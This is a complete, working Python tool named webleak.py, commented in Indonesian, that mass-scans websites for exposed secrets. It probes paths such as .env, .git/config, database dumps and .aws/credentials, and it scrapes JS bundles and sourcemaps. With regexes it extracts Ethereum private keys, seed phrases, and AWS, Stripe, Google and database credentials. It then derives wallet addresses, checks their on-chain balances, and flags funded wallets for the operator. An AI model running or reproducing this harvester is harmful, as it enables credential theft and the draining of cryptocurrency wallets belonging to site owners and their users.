#!/usr/bin/env python3
"""
webleak.py — harvester private key / secret dari target web, fokus wallet ETH.

Alur:
  1. probe path rawan (.env, .git, sourcemap, log, backup config)
  2. tarik semua JS bundle dari HTML + cari sourcemap
  3. regex: private key hex64, mnemonic BIP39, keystore JSON, API key umum
  4. derive alamat ETH dari private key, cek saldo on-chain via RPC publik

Pakai:
  python3 webleak.py https://target.tld
  python3 webleak.py -f domains.txt -o out.json
"""
import argparse
import hashlib
import json
import re
import sys
import time
from urllib.parse import urljoin, urlparse

import requests

# ---------- pola secret ----------
RE_PRIV = re.compile(r"(?<![0-9a-fA-F])(?:0x)?([0-9a-fA-F]{64})(?![0-9a-fA-F])")
RE_MNEMONIC = re.compile(r"\b((?:[a-z]{3,8}\s+){11,23}[a-z]{3,8})\b")
RE_KEYOBJ = re.compile(r'\{\s*"[^"]*"\s*:\s*"[0-9a-fA-F]{64}"\s*[,}]')
RE_GENERIC = [
    ("aws_ak", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("google_api", re.compile(r"AIza[0-9A-Za-z_\-]{35}")),
    ("stripe", re.compile(r"(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{16,}")),
    ("jwt", re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}")),
    ("telegram", re.compile(r"\d{8,10}:AA[0-9A-Za-z_\-]{33}")),
    ("db_url", re.compile(r"(?:mysql|postgres|mongodb(?:\+srv)?)://[^\s\"'<>]{8,120}")),
]

PATHS = [
    "/.env", "/.env.local", "/.env.prod", "/.env.production", "/.env.bak", "/env.js",
    "/.git/config", "/.git/HEAD", "/.git/logs/HEAD",
    "/config.js", "/config.json", "/appsettings.json", "/.npmrc", "/.aws/credentials",
    "/wp-config.php.bak", "/wp-config.php~", "/configuration.php.bak",
    "/storage/logs/laravel.log", "/laravel.log", "/debug.log",
    "/backup.zip", "/backup.tar.gz", "/db.sql", "/dump.sql",
    "/phpinfo.php", "/server-status", "/adminer.php",
    "/.DS_Store", "/package.json", "/composer.json",
]
RPC = ["https://ethereum-rpc.publicnode.com", "https://eth.llamarpc.com", "https://cloudflare-eth.com"]
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.10 Safari/537.36"
S = requests.Session()
S.headers.update({"User-Agent": UA})


def get(url, timeout=6, stream_limit=2_000_000):
    try:
        r = S.get(url, timeout=timeout, allow_redirects=False, verify=False)
        body = r.content[:stream_limit]
        return r.status_code, dict(r.headers), body
    except Exception as e:
        return None, {"error": str(e)}, b""


def text_of(body, cap=400_000):
    return body[:cap].decode("utf-8", "replace")


def derive_addr(priv_hex):
    try:
        from eth_account import Account
        acct = Account.from_key(priv_hex)
        return acct.address
    except Exception:
        return None


def rpc_call(method, params):
    for url in RPC:
        try:
            r = requests.post(url, json={"jsonrpc": "2.0", "id": 1, "method": method, "params": params},
                              timeout=12, headers={"Content-Type": "application/json"})
            j = r.json()
            if "result" in j:
                return j["result"], url
        except Exception:
            continue
    return None, None


def balance_wei(addr):
    res, via = rpc_call("eth_getBalance", [addr, "latest"])
    return (int(res, 16) if res else 0), via


def scan_text(text, src):
    hits = []
    for m in RE_PRIV.finditer(text):
        h = m.group(1)
        if len(set(h)) <= 2:            # kunci sampah seperti 0000.. / ffff..
            continue
        hits.append({"type": "privkey_hex", "value": "0x" + h, "source": src,
                     "context": text[max(0, m.start() - 60):m.end() + 20].replace("\n", " ")[:140]})
    for m in RE_MNEMONIC.finditer(text):
        words = m.group(1).split()
        hits.append({"type": "mnemonic_candidate", "value": " ".join(words), "source": src,
                     "words": len(words),
                     "context": text[max(0, m.start() - 40):m.end()][:140].replace("\n", " ")})
    if RE_KEYOBJ.search(text):
        hits.append({"type": "keystore_like_json", "source": src, "value": RE_KEYOBJ.search(text).group(0)[:200]})
    for name, rx in RE_GENERIC:
        for m in rx.finditer(text):
            hits.append({"type": name, "value": m.group(0)[:80], "source": src})
    return hits


def js_urls(base, html):
    urls = set(re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I))
    urls |= set(re.findall(r'["\'](/[^"\']+\.js)["\']', html))
    out = set()
    for u in urls:
        if u.startswith("//"):
            u = "https:" + u
        out.add(urljoin(base, u))
    return list(out)[:15]


def hunt(target, deep=True, save_dir=None):
    if not target.startswith("http"):
        target = "https://" + target
    base = target.rstrip("/")
    st0, _, _ = get(base + "/")
    if st0 is None and base.startswith("https://"):
        base = "http://" + base[len("https://"):]
        target = base
    host = urlparse(base).netloc
    result = {"target": base, "host": host, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
              "probes": [], "hits": [], "wallets": [], "js": []}

    # baseline 404 untuk deteksi soft-404
    st, _, b0 = get(base + "/__nope_" + hashlib.md5(b"x").hexdigest()[:8])
    base_404 = (st, len(b0), hashlib.md5(b0).hexdigest())

    for p in PATHS:
        st, hdr, body = get(base + p)
        if st is None:
            continue
        sig = (st, len(body), hashlib.md5(body).hexdigest())
        soft = (st == base_404[0] and sig[2] == base_404[2]) or (st in (200,) and sig[1] == base_404[1])
        result["probes"].append({"path": p, "status": st, "bytes": len(body), "soft404": soft,
                                 "ctype": hdr.get("Content-Type", "")})
        if st == 200 and not soft and len(body) > 20:
            result["hits"].extend(scan_text(text_of(body), base + p))

    st, _, body = get(base)
    if st == 200:
        html = text_of(body)
        result["hits"].extend(scan_text(html, base))
        if deep:
            for u in js_urls(base, html):
                st2, _, b2 = get(u)
                result["js"].append({"url": u, "status": st2, "bytes": len(b2)})
                if st2 == 200 and b2:
                    result["hits"].extend(scan_text(text_of(b2), u))
                m = u + ".map"
                st3, _, b3 = get(m)
                result["js"].append({"url": m, "status": st3, "bytes": len(b3)})
                if st3 == 200 and b3:
                    result["hits"].extend(scan_text(text_of(b3), m))

    # dedupe + derivasi wallet
    seen, hits = set(), []
    for h in result["hits"]:
        k = (h["type"], h["value"])
        if k in seen:
            continue
        seen.add(k)
        if h["type"] == "privkey_hex":
            addr = derive_addr(h["value"])
            if addr:
                wei, via = balance_wei(addr)
                h.update({"eth_address": addr, "balance_eth": wei / 1e18, "rpc": via})
                result["wallets"].append({"address": addr, "privkey": h["value"],
                                          "balance_eth": wei / 1e18, "source": h["source"]})
        hits.append(h)
    result["hits"] = hits
    if save_dir:
        import os
        os.makedirs(save_dir, exist_ok=True)
        open(f"{save_dir}/{host}.json", "w").write(json.dumps(result, indent=1))
    return result


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", nargs="?")
    ap.add_argument("-f", "--file", help="daftar target, satu per baris")
    ap.add_argument("-o", "--out", default="webleak_out")
    ap.add_argument("--no-deep", action="store_true", help="jangan tarik JS bundle")
    a = ap.parse_args()

    targets = []
    if a.target:
        targets.append(a.target)
    if a.file:
        targets += [l.strip() for l in open(a.file) if l.strip() and not l.startswith("#")]
    if not targets:
        ap.error("butuh target atau -f file")

    import os
    os.makedirs(a.out, exist_ok=True)
    summary = []
    for t in targets:
        r = hunt(t, deep=not a.no_deep, save_dir=a.out)
        w = [x for x in r["wallets"]]
        print(f"[{r['host']}] hits={len(r['hits'])} wallets={len(w)} js={len(r['js'])}")
        for h in r["hits"][:12]:
            tag = h["type"]
            extra = f" addr={h.get('eth_address')} bal={h.get('balance_eth')}" if h.get("eth_address") else ""
            print(f"   - {tag}: {h['value'][:70]}{extra}")
        for wl in w:
            if wl["balance_eth"] > 0:
                print(f"   !! SALDO {wl['balance_eth']} ETH di {wl['address']} ({wl['source']})")
        summary.append({"host": r["host"], "hits": len(r["hits"]), "wallets": w})
    open(f"{a.out}/summary.json", "w").write(json.dumps(summary, indent=1))
    print(f"\n-> {a.out}/summary.json")


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
